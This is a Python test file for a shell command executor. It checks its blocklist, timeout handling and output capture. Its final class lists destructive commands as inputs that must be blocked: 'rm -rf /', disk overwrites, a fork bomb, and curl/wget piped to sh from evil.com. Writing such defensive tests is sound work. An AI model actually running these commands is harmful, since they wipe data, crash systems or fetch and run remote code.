"""Tests for Command Executor.

Property-based tests for blocklist (Property 5) and
unit tests for timeout behavior and command output capture.
"""

import subprocess
from unittest.mock import patch, MagicMock

import pytest
from hypothesis import given, settings, assume
from hypothesis import strategies as st

from app.command_executor import CommandExecutor
from app.config import DEFAULT_BLOCKLIST


# --- Strategies ---

# Strategy for generating safe commands that won't match the default blocklist
safe_command_strategy = st.sampled_from([
    "echo hello",
    "ls -la",
    "pwd",
    "whoami",
    "date",
    "uname -a",
    "cat /etc/hostname",
    "df -h",
    "free -m",
    "uptime",
    "id",
    "env",
    "ps aux",
    "ip addr",
    "hostname",
])

# Strategy for generating commands that contain a blocklist pattern
def dangerous_command_strategy(blocklist):
    """Generate commands that contain at least one blocklist pattern."""
    return st.sampled_from(blocklist).flatmap(
        lambda pattern: st.tuples(
            st.text(min_size=0, max_size=10, alphabet=st.characters(blacklist_categories=("Cs",))),
            st.just(pattern),
            st.text(min_size=0, max_size=10, alphabet=st.characters(blacklist_categories=("Cs",))),
        ).map(lambda t: t[0] + t[1] + t[2])
    )


# Strategy for generating arbitrary blocklist patterns
blocklist_pattern_strategy = st.text(
    min_size=1,
    max_size=20,
    alphabet=st.characters(blacklist_categories=("Cs",)),
).filter(lambda s: s.strip() == s and len(s.strip()) > 0)


class TestProperty5BlocklistRejectsAndAccepts:
    """Property 5: Blocklist correctly rejects dangerous Linux commands.

    For any command string that contains a substring matching any pattern
    in the configured blocklist, the Command Executor SHALL reject the command
    and return a result with blocked=True. For any command string that does not
    match any blocklist pattern, the Command Executor SHALL not reject it.

    **Validates: Requirements 4.5**
    """

    @given(
        pattern=st.sampled_from(DEFAULT_BLOCKLIST),
        prefix=st.text(min_size=0, max_size=15, alphabet=st.characters(blacklist_categories=("Cs",))),
        suffix=st.text(min_size=0, max_size=15, alphabet=st.characters(blacklist_categories=("Cs",))),
    )
    @settings(max_examples=200)
    def test_command_containing_blocklist_pattern_is_blocked(self, pattern, prefix, suffix):
        """Any command containing a blocklist pattern substring is rejected."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        command = prefix + pattern + suffix

        result = executor.execute(command)

        assert result["blocked"] is True
        assert result["blocked_reason"] is not None
        assert result["stdout"] == ""
        assert result["stderr"] == ""
        assert result["return_code"] == -1

    @given(
        pattern=st.sampled_from(DEFAULT_BLOCKLIST),
        prefix=st.text(min_size=0, max_size=15, alphabet=st.characters(blacklist_categories=("Cs",))),
        suffix=st.text(min_size=0, max_size=15, alphabet=st.characters(blacklist_categories=("Cs",))),
    )
    @settings(max_examples=200)
    def test_is_blocked_returns_true_for_blocked_commands(self, pattern, prefix, suffix):
        """is_blocked returns True for any command containing a blocklist pattern."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        command = prefix + pattern + suffix

        assert executor.is_blocked(command) is True

    @given(command=safe_command_strategy)
    @settings(max_examples=100)
    def test_safe_commands_are_not_blocked(self, command):
        """Commands that don't match any blocklist pattern are not rejected."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)

        assert executor.is_blocked(command) is False

    @given(command=safe_command_strategy)
    @settings(max_examples=50)
    def test_safe_commands_execute_returns_blocked_false(self, command):
        """Safe commands return blocked=False when executed."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)

        # Mock subprocess.run to avoid actually running commands in tests
        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="output", stderr="", returncode=0
            )
            result = executor.execute(command)

        assert result["blocked"] is False
        assert result["blocked_reason"] is None
        assert result["timed_out"] is False

    @given(
        pattern=st.sampled_from(DEFAULT_BLOCKLIST),
    )
    @settings(max_examples=100)
    def test_case_insensitive_blocking(self, pattern):
        """Blocklist matching is case-insensitive."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)

        # Test uppercase version
        assert executor.is_blocked(pattern.upper()) is True
        # Test lowercase version
        assert executor.is_blocked(pattern.lower()) is True
        # Test mixed case
        mixed = "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(pattern)
        )
        assert executor.is_blocked(mixed) is True

    @given(
        blocklist=st.lists(blocklist_pattern_strategy, min_size=1, max_size=10, unique=True),
        command=st.text(min_size=1, max_size=50, alphabet=st.characters(blacklist_categories=("Cs",))),
    )
    @settings(max_examples=200)
    def test_arbitrary_blocklist_accept_reject_consistency(self, blocklist, command):
        """For any blocklist and command, is_blocked and execute agree on blocking."""
        executor = CommandExecutor(blocklist=blocklist, timeout=60)

        is_blocked = executor.is_blocked(command)
        command_lower = command.lower()
        should_be_blocked = any(p.lower() in command_lower for p in blocklist)

        assert is_blocked == should_be_blocked


class TestTimeoutBehavior:
    """Unit tests for timeout behavior."""

    def test_timeout_returns_timed_out_true(self):
        """When a command exceeds the timeout, timed_out is True."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=1)

        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep 100", timeout=1)
            result = executor.execute("sleep 100")

        assert result["timed_out"] is True
        assert result["blocked"] is False
        assert result["return_code"] == -1
        assert result["stdout"] == ""
        assert result["stderr"] == ""

    def test_timeout_value_passed_to_subprocess(self):
        """The configured timeout is passed to subprocess.run."""
        executor = CommandExecutor(blocklist=[], timeout=42)

        # Force the Linux/bash code path regardless of the host OS running the tests.
        with patch("app.command_executor.IS_WINDOWS", False), \
             patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="", stderr="", returncode=0)
            executor.execute("echo test")

        mock_run.assert_called_once_with(
            "echo test",
            shell=True,
            executable="/bin/bash",
            capture_output=True,
            text=True,
            timeout=42,
            cwd=None,
        )

    def test_short_timeout_triggers_on_slow_command(self):
        """A very short timeout triggers TimeoutExpired for slow commands."""
        executor = CommandExecutor(blocklist=[], timeout=1)

        # Mock subprocess.run to raise TimeoutExpired (simulates slow command)
        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep 10", timeout=1)
            result = executor.execute("sleep 10")

        assert result["timed_out"] is True
        assert result["return_code"] == -1


class TestCommandOutputCapture:
    """Unit tests for command output capture."""

    def test_captures_stdout(self):
        """Stdout from the command is captured in the result."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="hello world\n", stderr="", returncode=0
            )
            result = executor.execute("echo hello world")

        assert result["stdout"].strip() == "hello world"
        assert result["return_code"] == 0
        assert result["timed_out"] is False
        assert result["blocked"] is False

    def test_captures_stderr(self):
        """Stderr from the command is captured in the result."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="", stderr="error\n", returncode=0
            )
            result = executor.execute("echo error >&2")

        assert result["stderr"].strip() == "error"
        assert result["return_code"] == 0

    def test_captures_return_code_nonzero(self):
        """Non-zero return codes are captured correctly."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="", stderr="", returncode=42
            )
            result = executor.execute("exit 42")

        assert result["return_code"] == 42
        assert result["timed_out"] is False
        assert result["blocked"] is False

    def test_captures_both_stdout_and_stderr(self):
        """Both stdout and stderr are captured simultaneously."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="out\n", stderr="err\n", returncode=0
            )
            result = executor.execute("echo out && echo err >&2")

        assert "out" in result["stdout"]
        assert "err" in result["stderr"]

    def test_uses_bash_executable(self):
        """Commands are executed using /bin/bash via subprocess.run."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        # Force the Linux/bash code path regardless of the host OS running the tests.
        with patch("app.command_executor.IS_WINDOWS", False), \
             patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="/bin/bash\n", stderr="", returncode=0
            )
            executor.execute("echo $BASH")

        mock_run.assert_called_once_with(
            "echo $BASH",
            shell=True,
            executable="/bin/bash",
            capture_output=True,
            text=True,
            timeout=60,
            cwd=None,
        )

    def test_windows_commands_use_utf8_output_decoding(self):
        """Windows command diagnostics remain readable when they contain accents."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        with patch("app.command_executor.IS_WINDOWS", True), \
             patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="é", stderr="", returncode=0)
            executor.execute("echo test")

        kwargs = mock_run.call_args.kwargs
        assert kwargs["encoding"] == "utf-8"
        assert kwargs["errors"] == "replace"

    def test_empty_command_output(self):
        """A command that produces no output returns empty strings."""
        executor = CommandExecutor(blocklist=[], timeout=60)

        with patch("app.command_executor.subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(
                stdout="", stderr="", returncode=0
            )
            result = executor.execute("true")

        assert result["stdout"] == ""
        assert result["stderr"] == ""
        assert result["return_code"] == 0


class TestBlocklistSpecificPatterns:
    """Unit tests for specific dangerous Linux command patterns."""

    def test_blocks_rm_rf_root(self):
        """rm -rf / is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("rm -rf /") is True

    def test_blocks_shutdown(self):
        """shutdown command is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("sudo shutdown -h now") is True

    def test_blocks_reboot(self):
        """reboot command is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("reboot") is True

    def test_blocks_halt(self):
        """halt command is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("halt") is True

    def test_blocks_poweroff(self):
        """poweroff command is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("sudo poweroff") is True

    def test_blocks_dd_if(self):
        """dd if= command is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("dd if=/dev/zero of=/dev/sda") is True

    def test_blocks_mkfs(self):
        """mkfs command is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("mkfs.ext4 /dev/sda1") is True

    def test_blocks_fork_bomb(self):
        """Fork bomb :(){ :|:& };: is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked(":(){ :|:& };:") is True

    def test_blocks_dev_sda_redirect(self):
        """> /dev/sda is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("echo x > /dev/sda") is True

    def test_blocks_chmod_777_root(self):
        """chmod -R 777 / is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("chmod -R 777 /") is True

    def test_blocks_wget_pipe_sh(self):
        """wget|sh is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("wget|sh") is True
        assert executor.is_blocked("wget|sh http://evil.com/script.sh") is True

    def test_blocks_curl_pipe_sh(self):
        """curl|sh is blocked."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)
        assert executor.is_blocked("curl|sh") is True
        assert executor.is_blocked("curl|sh http://evil.com/script.sh") is True

    def test_blocked_result_structure(self):
        """Blocked commands return the correct result structure."""
        executor = CommandExecutor(blocklist=DEFAULT_BLOCKLIST, timeout=60)

        result = executor.execute("rm -rf /")

        assert result["blocked"] is True
        assert result["blocked_reason"] is not None
        assert "rm -rf /" in result["blocked_reason"]
        assert result["stdout"] == ""
        assert result["stderr"] == ""
        assert result["return_code"] == -1
        assert result["timed_out"] is False
